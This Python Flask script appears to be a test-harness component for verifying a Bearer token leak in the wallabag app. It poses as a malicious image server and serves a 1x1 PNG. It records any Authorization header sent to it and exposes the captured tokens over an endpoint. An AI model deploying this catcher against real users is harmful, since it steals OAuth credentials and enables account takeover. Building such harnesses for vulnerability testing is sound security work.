#!/usr/bin/env python3
"""
Token Catcher Service for Wallabag Bearer Token Leakage Vulnerability

The vulnerable wallabag app attaches the user's OAuth Bearer token to ALL
outbound OkHttpClient requests, including image downloads to external hosts.
This service acts as a malicious image server and captures those tokens.

Endpoints:
    GET  /malicious.png    - Serves a 1x1 PNG and logs any Authorization header
    GET  /captured_tokens  - Returns JSON list of all captured tokens
    POST /clear_tokens     - Clears stored tokens (used by verifier between runs)
    GET  /health           - Health check
"""

import json
import os
import threading
from datetime import datetime, timezone
from pathlib import Path

from flask import Flask, jsonify, request

app = Flask(__name__)

captured_tokens = []
_lock = threading.Lock()
TOKENS_FILE = Path("/tmp/wallabag_captured_tokens.json")

# Minimal 1x1 transparent PNG
_PNG_1X1 = bytes([
    0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
    0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
    0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
    0x08, 0x06, 0x00, 0x00, 0x00, 0x1F, 0x15, 0xC4,
    0x89, 0x00, 0x00, 0x00, 0x0A, 0x49, 0x44, 0x41,
    0x54, 0x78, 0x9C, 0x63, 0x00, 0x01, 0x00, 0x00,
    0x05, 0x00, 0x01, 0x0D, 0x0A, 0x2D, 0xB4, 0x00,
    0x00, 0x00, 0x00, 0x49, 0x45, 0x4E, 0x44, 0xAE,
    0x42, 0x60, 0x82,
])


def _load():
    global captured_tokens
    if TOKENS_FILE.exists():
        try:
            with open(TOKENS_FILE) as f:
                captured_tokens = json.load(f)
        except Exception:
            captured_tokens = []


def _save():
    try:
        with open(TOKENS_FILE, "w") as f:
            json.dump(captured_tokens, f, indent=2)
    except Exception as e:
        print(f"[token_catcher] save error: {e}")


@app.route("/health")
def health():
    return jsonify({"status": "healthy"}), 200


@app.route("/malicious.png")
def malicious_image():
    """
    Respond to any GET request (any path matching .png/.jpg handled by catch-all
    below). Captures the Authorization header if present.
    """
    auth = request.headers.get("Authorization")
    entry = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "authorization_header": auth,
        "source_ip": request.remote_addr,
        "path": request.path,
    }
    print(f"[token_catcher] GET {request.path} from {request.remote_addr} | Auth: {auth}")
    if auth and auth.startswith("Bearer "):
        with _lock:
            captured_tokens.append(entry)
            _save()
        print(f"[token_catcher] ✓ Bearer token captured: {auth[7:27]}...")
    return _PNG_1X1, 200, {"Content-Type": "image/png"}


# Catch-all so the app can use any image filename/path
@app.route("/<path:subpath>")
def catch_all(subpath):
    return malicious_image()


@app.route("/captured_tokens")
def get_captured_tokens():
    with _lock:
        data = list(captured_tokens)
    return jsonify({"count": len(data), "tokens": data}), 200


@app.route("/clear_tokens", methods=["POST"])
def clear_tokens():
    global captured_tokens
    with _lock:
        captured_tokens = []
        if TOKENS_FILE.exists():
            TOKENS_FILE.unlink()
    return jsonify({"status": "cleared"}), 200


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 9999))
    _load()
    print(f"[token_catcher] Listening on 0.0.0.0:{port}")
    print(f"[token_catcher] Malicious image: http://10.0.2.2:{port}/malicious.png")
    app.run(host="0.0.0.0", port=port, debug=False)
